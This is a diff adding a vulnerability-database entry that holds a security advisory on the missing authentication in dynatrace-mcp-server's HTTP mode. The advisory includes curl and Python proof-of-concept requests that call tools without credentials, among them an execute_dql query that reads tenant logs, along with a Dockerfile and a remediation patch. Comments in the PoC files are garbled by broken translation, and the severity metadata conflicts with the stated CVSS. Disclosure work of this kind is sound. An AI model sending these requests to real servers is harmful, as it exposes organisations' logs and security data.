@@ -1,0 +1,377 @@
+[basic]
+description = '''
+### Summary
+
+`@dynatrace-oss/dynatrace-mcp-server` v1.8.5 exposes an HTTP transport mode (`--http` flag) that performs no authentication, session validation, or origin/host verification before dispatching MCP tool calls. Any network-reachable attacker can send a raw JSON-RPC `tools/call` request without an `Authorization` header and have it executed directly under the victim server's Dynatrace credentials. Confirmed high-impact tools reachable without authentication include `execute_dql` (reads arbitrary Grail data, including logs, security events, and user sessions) and `create_dynatrace_notebook` (writes notebooks to the tenant).
+
+### Details
+
+When the server is started with the `--http` flag, an HTTP server is created at `src/index.ts:1621`. For every inbound request the handler creates a new `StreamableHTTPServerTransport` instance:
+
+```ts
+// src/index.ts:1638-1640
+const httpTransport = new StreamableHTTPServerTransport({
+  sessionIdGenerator: undefined, // No Session ID needed
+});
+```
+
+No bearer-token check, session token, `Host` allowlist, or `Origin` allowlist is configured on either the transport or in the surrounding request handler. The raw body is parsed and handed directly to the transport:
+
+```ts
+// src/index.ts:1648-1668
+body = JSON.parse(rawBody);
+...
+await httpTransport.handleRequest(req, res, body);
+```
+
+Two tools are directly reachable by an unauthenticated HTTP caller without any `requestHumanApproval` gate:
+
+**`execute_dql` — Confidentiality: High**
+```ts
+// src/index.ts:746-769
+// No requestHumanApproval before createAuthenticatedHttpClient
+const dtClient = await createAuthenticatedHttpClient(scopesBase.concat('storage:buckets:read', ...));
+return executeDql(dtClient, { query });
+```
+An attacker can run arbitrary DQL queries (logs, security events, user sessions, metrics) using the victim's Dynatrace credentials.
+
+**`create_dynatrace_notebook` — Integrity: Low**
+```ts
+// src/index.ts:1593-1600
+// No requestHumanApproval before createAuthenticatedHttpClient
+const dtClient = await createAuthenticatedHttpClient(scopesBase.concat('document:write'));
+return createNotebook(dtClient, { name, sections });
+```
+An attacker can create notebooks under the victim's tenant.
+
+> **Note on `send_event`:** The initial static report claimed `send_event` was also unguarded. Code inspection at `src/index.ts:1367` confirms a `requestHumanApproval` call exists inside the `send_event` handler. An HTTP attacker (no MCP elicitation loop) causes that call to throw, and the catch block returns `false`, effectively blocking the write. The `send_event` path is therefore not exploitable via the HTTP attack vector.
+
+> **Note on PoC tool `reset_grail_budget`:** The PoC uses `reset_grail_budget` (`src/index.ts:1218-1239`), which performs no Dynatrace API calls — it resets in-memory budget counters only. It is used purely as a safe, self-contained proof that unauthenticated dispatch works; actual data exfiltration requires `execute_dql` with real credentials.
+
+### PoC
+
+**Environment setup (Docker):**
+
+```bash
+# Build from repository root
+docker build \
+  -t dynatrace-mcp-vuln001:latest \
+  -f /path/to/vuln-001/Dockerfile \
+  /path/to/dynatrace-mcp/repo
+
+# Run — abc12345 in hostname activates demo mode, skipping real API connectivity check
+docker run -d \
+  --name dynatrace-mcp-vuln001-test \
+  -p 127.0.0.1:3999:3999 \
+  -e DT_ENVIRONMENT=https://abc12345.apps.dynatrace.com \
+  -e DT_PLATFORM_TOKEN=fake-token-for-poc \
+  dynatrace-mcp-vuln001:latest \
+  --http --port 3999 --host 0.0.0.0
+```
+
+**Unauthenticated tool invocation (no `Authorization` header):**
+
+```bash
+curl -sS -N -X POST http://127.0.0.1:3999/ \
+  -H 'Content-Type: application/json' \
+  -H 'Accept: application/json, text/event-stream' \
+  -H 'Mcp-Protocol-Version: 2025-03-26' \
+  --data '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{\"name\":\"reset_grail_budget\",\"arguments\":{}}}'
+```
+
+**Observed response (HTTP 200, no authentication required):**
+
+```
+HTTP/1.1 200 OK
+content-type: text/event-stream
+
+event: message
+data: {\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"✅ **Grail Budget Reset Successfully!**\n\nBudget status after reset:\n- Total bytes scanned: 0 bytes (0 GB)\n- Budget limit: 5000 GB\n- Remaining budget: 5000 GB\n- Budget exceeded: No\"}]},\"jsonrpc\":\"2.0\",\"id\":1}
+```
+
+**Python PoC script** (automated, with server-readiness polling):
+
+```bash
+python3 poc.py 127.0.0.1 3999
+# Exits 0 on confirmed unauthenticated tool execution
+# Exits 2 if server correctly returns HTTP 401 (patched)
+```
+
+**High-impact variant with real credentials — data exfiltration via `execute_dql`:**
+
+```bash
+curl -sS -N -X POST http://<server>:3000/ \
+  -H 'Content-Type: application/json' \
+  -H 'Accept: application/json, text/event-stream' \
+  -H 'Mcp-Protocol-Version: 2025-03-26' \
+  --data '{
+    \"jsonrpc\": \"2.0\",
+    \"id\": 2,
+    \"method\": \"tools/call\",
+    \"params\": {
+      \"name\": \"execute_dql\",
+      \"arguments\": {
+        \"query\": \"fetch logs | limit 10\"
+      }
+    }
+  }'
+```
+
+**Recommended remediation:**
+
+```diff
+--- a/src/index.ts
++++ b/src/index.ts
++import { timingSafeEqual } from 'node:crypto';
+
++    .option('--http-auth-token <token>', 'bearer token required for HTTP server mode')
+
++  const httpAuthToken = options.httpAuthToken || process.env.DT_MCP_HTTP_AUTH_TOKEN;
++
++  const isAuthorizedHttpRequest = (req: IncomingMessage): boolean => {
++    const expected = httpAuthToken ? Buffer.from(`Bearer ${httpAuthToken}`) : undefined;
++    const actualHeader = req.headers.authorization;
++    if (!expected || !actualHeader) return false;
++    const actual = Buffer.from(actualHeader);
++    return actual.length === expected.length && timingSafeEqual(actual, expected);
++  };
+
+   if (httpMode) {
++    if (!httpAuthToken) {
++      console.error('HTTP mode requires --http-auth-token or DT_MCP_HTTP_AUTH_TOKEN.');
++      process.exit(1);
++    }
+     const httpServer = createServer(async (req, res) => {
++      if (!isAuthorizedHttpRequest(req)) {
++        res.writeHead(401, { 'Content-Type': 'application/json', 'WWW-Authenticate': 'Bearer' });
++        res.end(JSON.stringify({ jsonrpc: '2.0', id: null, error: { code: -32001, message: 'Unauthorized' } }));
++        return;
++      }
+
+       const httpTransport = new StreamableHTTPServerTransport({
+         sessionIdGenerator: undefined,
++        enableDnsRebindingProtection: true,
++        allowedHosts: [`${host}:${httpPort}`, `127.0.0.1:${httpPort}`, `localhost:${httpPort}`],
+       });
+```
+
+### Impact
+
+This is a **Missing Authentication for Critical Function** vulnerability. The HTTP transport mode acts as an unauthenticated proxy to the victim's Dynatrace tenant: any attacker who can reach the server port can read sensitive observability data (logs, security events, user sessions, metrics) via `execute_dql` and write notebook documents via `create_dynatrace_notebook`, all under the configured Dynatrace credentials without needing to know those credentials.
+
+**Who is impacted:** Organizations running `dynatrace-mcp-server` with the `--http` flag enabled — particularly deployments using `--host 0.0.0.0` (documented and supported), container deployments, or any deployment where the port is reachable from an untrusted network. Localhost-only deployments are at reduced but non-zero risk via DNS rebinding or same-host compromise. With `--host 0.0.0.0` the attack requires no user interaction and no complex conditions, raising the effective CVSS score to 9.3.
+
+### Reproduction artifacts
+
+#### `Dockerfile`
+
+```dockerfile
+# VULN-001: Unauthenticated HTTP MCP Tool Invocation (CWE-306)
+# build stage - text sourcefrom dynatrace-mcp-server build
+FROM node:22.21.1-alpine3.22 AS build
+
+WORKDIR /app
+
+# repo copy the full repo source (hosttext clone repo pathfrom textand build)
+COPY . .
+
+RUN npm ci
+RUN npm run build
+
+# runtime textonly install (dist/package.json criteria)
+RUN cd dist && npm install --ignore-scripts && npm cache clean --force
+
+# runtime stage
+FROM node:22.21.1-alpine3.22
+
+WORKDIR /app
+
+COPY --from=build --chown=node:node /app/dist /app/dist
+
+USER node
+
+# environment variable: fake Dynatrace credentials (actual API calltext without reset_grail_budget PoCtext)
+# abc12345 contains when isDemoEnvironment=true → text text skip (src/index.ts:179)
+ENV DT_ENVIRONMENT=https://abc12345.apps.dynatrace.com
+ENV DT_PLATFORM_TOKEN=fake-token-for-poc
+
+# HTTP text server start (--http: vulnerability text flag)
+ENTRYPOINT [\"node\", \"dist/index.js\"]
+CMD [\"--http\", \"--port\", \"3999\", \"--host\", \"0.0.0.0\"]
+```
+
+#### `poc.py`
+
+```python
+#!/usr/bin/env python3
+\"\"\"
+VULN-001 PoC: Unauthenticated HTTP MCP Tool Invocation (CWE-306)
+
+Proof objective:
+  dynatrace-mcp-servertext --http text executetext when, Authorization headertext
+  session token text tools/call requesttext sendand MCP tooltext executeto do can existstext proof.
+
+Attack target tool: reset_grail_budget
+  - actual Dynatrace API call text in-memory statusonly secondstext (textbeforetext PoC target)
+  - success response: \"Grail Budget Reset Successfully\" string contains
+
+usage:
+  python3 poc.py [host] [port]
+  python3 poc.py 127.0.0.1 3999
+\"\"\"
+
+import sys
+import socket
+import time
+import json
+
+HOST = sys.argv[1] if len(sys.argv) > 1 else \"127.0.0.1\"
+PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 3999
+TIMEOUT = 15
+
+
+def wait_for_server(host: str, port: int, retries: int = 20, delay: float = 1.0) -> bool:
+    for i in range(retries):
+        try:
+            s = socket.create_connection((host, port), timeout=2)
+            s.close()
+            return True
+        except (ConnectionRefusedError, OSError):
+            print(f\"[*] server wait in progress... ({i+1}/{retries})\", flush=True)
+            time.sleep(delay)
+    return False
+
+
+def send_unauthenticated_mcp_call(host: str, port: int) -> dict:
+    \"\"\"
+    without an authentication header MCP tools/call send request.
+    vulnerability: StreamableHTTPServerTransport create when sessionIdGenerator: undefinedonly configuration,
+            Bearer token/Origin/Host verification beforetext none (src/index.ts:1638-1640).
+    \"\"\"
+    payload = json.dumps({
+        \"jsonrpc\": \"2.0\",
+        \"id\": 1,
+        \"method\": \"tools/call\",
+        \"params\": {
+            \"name\": \"reset_grail_budget\",
+            \"arguments\": {}
+        }
+    })
+
+    # authentication header textas omit - textthattext vulnerability prooftext key point
+    request = (
+        f\"POST / HTTP/1.1\r\n\"
+        f\"Host: {host}:{port}\r\n\"
+        f\"Content-Type: application/json\r\n\"
+        f\"Accept: application/json, text/event-stream\r\n\"
+        f\"Mcp-Protocol-Version: 2025-03-26\r\n\"
+        f\"Content-Length: {len(payload)}\r\n\"
+        f\"Connection: close\r\n\"
+        f\"\r\n\"
+        f\"{payload}\"
+    )
+
+    s = socket.create_connection((host, port), timeout=TIMEOUT)
+    s.sendall(request.encode())
+
+    response_chunks = []
+    s.settimeout(TIMEOUT)
+    try:
+        while True:
+            chunk = s.recv(4096)
+            if not chunk:
+                break
+            response_chunks.append(chunk.decode(\"utf-8\", errors=\"replace\"))
+    except socket.timeout:
+        pass
+    s.close()
+
+    return \"\".join(response_chunks)
+
+
+def main():
+    print(f\"[VULN-001 PoC] Unauthenticated HTTP MCP Tool Invocation\")
+    print(f\"[*] target: http://{HOST}:{PORT}/\")
+    print(f\"[*] authentication header: none (text omit - vulnerability proof)\")
+    print(f\"[*] call tool: reset_grail_budget\")
+    print()
+
+    # wait for server readiness
+    print(f\"[*] waiting for server response...\")
+    if not wait_for_server(HOST, PORT):
+        print(f\"[FAIL] {HOST}:{PORT} from server is not responding.\")
+        sys.exit(1)
+
+    print(f\"[*] server connection succeeded\")
+    print(f\"[*] without authentication tools/call send request...\")
+    print()
+
+    raw_response = send_unauthenticated_mcp_call(HOST, PORT)
+
+    print(\"=== HTTP response raw text ===\")
+    print(raw_response)
+    print(\"=== response text ===\")
+    print()
+
+    # evidence verification
+    # HTTP 401 Unauthorizedtext returnif it becomes vulnerability none (textdone)
+    if \"401\" in raw_response and \"Unauthorized\" in raw_response:
+        print(\"[FAIL] servertext 401 Unauthorizedtext returntext - authenticationtext textbecomes exists\")
+        print(\"[conclusion] vulnerabilitytext text authenticationtext enabledbecomes exists.\")
+        sys.exit(2)
+
+    # success condition: reset_grail_budget result text contains
+    if \"Grail Budget Reset Successfully\" in raw_response:
+        print(\"[PASS] without authentication MCP tool execute success!\")
+        print(\"[evidence] responsetext 'Grail Budget Reset Successfully' contains\")
+        print(\"[conclusion] VULN-001 confirmed: --http textfrom without authentication tools/call execute possible\")
+        sys.exit(0)
+
+    # jsonrpc result parse attempt
+    for line in raw_response.split(\"\n\"):
+        line = line.strip()
+        if line.startswith(\"data:\") or line.startswith(\"{\"):
+            try:
+                data_str = line[5:].strip() if line.startswith(\"data:\") else line
+                data = json.loads(data_str)
+                if \"result\" in data:
+                    print(\"[PASS] JSON-RPC result received - without authentication tool call success\")
+                    print(f\"[evidence] {json.dumps(data, ensure_ascii=False)}\")
+                    sys.exit(0)
+                if \"error\" in data:
+                    err = data[\"error\"]
+                    print(f\"[INFO] JSON-RPC error response: code={err.get('code')}, message={err.get('message')}\")
+            except json.JSONDecodeError:
+                pass
+
+    print(\"[INCOMPLETE] expected response patterntext text text.\")
+    print(\"[text] above response raw texttext check this.\")
+    sys.exit(3)
+
+
+if __name__ == \"__main__\":
+    main()
+```
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "`@dynatrace-oss/dynatrace-mcp-server` has Unauthenticated HTTP MCP Tool Invocation"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-p7w7-4929-vpj5"]
+ave_id = "AVE-2026-0744"
+
+[meta]
+collected_at = "2026-08-02T12:37:04.571347922+00:00"
+status = "completed"
+
+[references]
+urls = []
